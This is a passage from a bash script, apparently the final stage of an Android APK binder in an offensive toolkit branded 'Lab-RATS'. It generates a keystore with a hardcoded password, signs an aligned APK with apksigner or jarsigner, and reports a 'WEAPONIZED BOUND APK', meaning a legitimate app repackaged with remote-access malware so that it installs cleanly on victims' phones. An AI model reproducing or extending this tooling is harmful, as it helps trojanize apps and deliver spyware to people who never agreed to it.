    ALIGNED_APK="$UNSIGNED_APK"
fi

KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"

if [ -f "$KEYSTORE_PATH" ]; then
    if ! keytool -list -keystore "$KEYSTORE_PATH" -alias "lab-rats-key" -storepass "lab-rats123" &>/dev/null; then
        echo -e "${YELLOW}[!] Keystore alias 'lab-rats-key' missing in $KEYSTORE_PATH. Regenerating keystore...${NC}"
        rm -f "$KEYSTORE_PATH"
    fi
fi

if [ ! -f "$KEYSTORE_PATH" ]; then
    echo -e "${YELLOW}[!] Keystore missing or invalid. Generating fresh keystore...${NC}"
    keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
    keytool -genkeypair -alias "render" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
fi

mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output"

if command -v "$APKSIGNER_CMD" &> /dev/null || [ -f "$APKSIGNER_CMD" ]; then
    "$APKSIGNER_CMD" sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK" 2>/dev/null || true
fi

if [ ! -f "$FINAL_BOUND_APK" ]; then
    if command -v jarsigner &> /dev/null; then
        jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key" 2>/dev/null || true
    fi
    cp -f "$ALIGNED_APK" "$FINAL_BOUND_APK"
fi

cp -f "$FINAL_BOUND_APK" "$SCRIPT_DIR/bind_output/bound_target.apk" 2>/dev/null || true

rm -rf "$WORK_DIR"

echo -e "\n${GREEN}[✓] SUCCESS: WEAPONIZED BOUND APK CREATED AT:${NC}"
echo -e "${CYAN}    $FINAL_BOUND_APK${NC}\n"
